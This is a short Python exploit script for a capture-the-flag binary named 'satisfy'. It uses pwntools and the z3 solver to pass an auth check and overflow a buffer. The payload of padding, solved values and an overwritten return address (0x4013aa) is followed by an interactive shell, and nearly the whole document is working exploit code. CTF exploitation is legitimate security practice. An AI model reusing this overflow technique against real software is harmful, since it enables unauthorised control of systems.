from pwn import *
from z3 import *

p = process("./satisfy")
#p = remote("0.cloud.chals.io", 34720)

p.recvuntil("token ")
rand = int(p.recvline()[:-1])
print(rand)

# first 16 bytes do not matter...
# after that:
# 8 bytes stored into rcx -> rsi
# 8 bytes stored into rax -> rdi

# auth function
# store 24:28 in ecx
# store 16:24 in rax
# shift rax by cl (24:26)
# store in rdx
# xor rand key by rax
# final value must be 0x7a69

desiredOutput = 0x7a69

a = BitVec("a", 64)
b = BitVec("b", 64)

z = Solver()

z.add(b >> 8 == 0)
z.add(((a << b) ^ int(rand)) == 0x7a69)

abytes = b""
bbytes = b""
if z.check() == sat:
	print(str(z.check()))
	solution = z.model()
	abytes = p64(int(str(solution[a])))
	bbytes = p64(int(str(solution[b])))
	print(abytes, bbytes)

payload = b"A"*16 + bbytes + abytes + b"A"* 8 + p64(0x4013aa)
print(payload)
p.sendline(payload)
p.interactive()
